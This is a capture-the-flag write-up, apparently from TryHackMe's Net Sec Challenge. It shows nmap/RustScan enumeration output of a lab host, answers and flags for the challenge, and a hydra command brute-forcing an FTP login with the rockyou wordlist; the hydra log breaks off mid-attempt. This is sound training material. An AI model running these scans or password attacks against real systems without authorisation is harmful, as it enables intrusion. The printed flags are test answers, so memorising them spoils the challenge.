---
Practice the skills you have learned in the Network Security module.
---

# Net Sec Challenge — Writeup

## Overview
### Net Sec Challenge — Writeup
### Net Sec Challenge — Writeup
### Introduction
Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only nmap, telnet, and hydra.
Launch the AttackBox and the target VM. *No answer needed*
### Challenge Questions
You can answer the following questions using Nmap, Telnet, and Hydra.

## Enumeration
```text
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.26.227 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.26.227:22
Open 10.10.26.227:80
Open 10.10.26.227:139
Open 10.10.26.227:445
Open 10.10.26.227:8080
Open 10.10.26.227:10021
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 13:11 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Initiating Ping Scan at 13:11
Scanning 10.10.26.227 [2 ports]
Completed Ping Scan at 13:11, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:11
Completed Parallel DNS resolution of 1 host. at 13:11, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:11
Scanning 10.10.26.227 [6 ports]
Discovered open port 445/tcp on 10.10.26.227
Discovered open port 8080/tcp on 10.10.26.227
Discovered open port 80/tcp on 10.10.26.227
Discovered open port 139/tcp on 10.10.26.227
Discovered open port 22/tcp on 10.10.26.227
Discovered open port 10021/tcp on 10.10.26.227
Completed Connect Scan at 13:11, 0.20s elapsed (6 total ports)
Initiating Service scan at 13:11
Scanning 6 services on 10.10.26.227
Completed Service scan at 13:11, 11.60s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.26.227.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 5.78s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 1.42s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Nmap scan report for 10.10.26.227
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-08-31 13:11:38 EDT for 19s

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack (protocol 2.0)
| ssh-hostkey: 
|   3072 da:5f:69:e2:11:1f:7c:66:80:89:61:54:e8:7b:16:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI/lsJvB7tVnxblzcauj2/zvS2sREr9M28uEKQoWcfewzEn0gKyB8NJ5IRm+VxmgOAQpebzqZjZ+Wx9Ahd+gFRjpCvKCpLvxT58YK2thQrzyeT8HY03f7lhNBgUdLm/3gNcqV4cGO6PcxoWvxYIbbM98oiiAiWKBfzHocWAEh85bvY0E7ftelUp4P8DG2f0jERy2VMwEWzSzbB0DUSaasH57RJsNYQBE5jBdCwDbasaI5P04WHDCPk2wu9sc0MukhyDidK1/kWCdLHycfKGOWYC2XyCunGfiD1ynljDrRaqgagdjvfjHka81Ol17J00ILKyfM88yYqEeUCFAnQncTDPwIC7QTAPqKsw9fGWGdEYmo6Jur+v406kk/6xTQ2eOj+S1hD9ahzWFIy2MwrrwmFn3Hcb7/xfCw5rZJIVZWaoSWQYO71kGgoWAJZzKHziv0NUkgofTFpQGWthveIIMx1PNPdaIUH5M0/gbk5XscdbYjFuOFP5canSOQuxG8Prt8=
|   256 3f:8c:09:46:ab:1c:df:d7:35:83:cf:6d:6e:17:7e:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP1eIIFNNbSO2weyRY0pHKChu4RtCBTyhTjMOCSW/lRlmcZv1Glitrms3x2WQQ4CWjHw2XalVZvRursXCcUEOnQ=
|   256 ed:a9:3a:aa:4c:6b:16:e6:0d:43:75:46:fb:33:b2:29 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+Y0H+tldbG0k08Zkd3Lx1oBTlLh2KXyzS0lInfZmRp
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        syn-ack lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
8080/tcp  open  http        syn-ack Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
10021/tcp open  ftp         syn-ack vsftpd 3.0.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.92%I=7%D=8/31%Time=630F9650%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
Service Info: OS: Unix

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17296/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58216/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 60196/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7635/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: NETSEC-CHALLENG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   NETSEC-CHALLENG<00>  Flags: <unique><active>
|   NETSEC-CHALLENG<03>  Flags: <unique><active>
|   NETSEC-CHALLENG<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time: 
|   date: 2022-08-31T17:11:51
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:11
Completed NSE at 13:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds
```
What is the highest port number being open less than 10,000?
*8080*
There is an open port outside the common 1000 ports; it is above 10,000. What is it?
*10021*
How many TCP ports are open?
*6*
What is the flag hidden in the HTTP server header?
What is the flag hidden in the SSH server header?
We have an FTP server listening on a nonstandard port. What is the version of the FTP server? *vsftpd 3.0.3*
```text
┌──(kali㉿kali)-[~]
└─$ hydra -t 16 -l quinn -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.26.227:10021
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-31 13:21:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.26.227:10021/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.26.227 - login "quinn" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
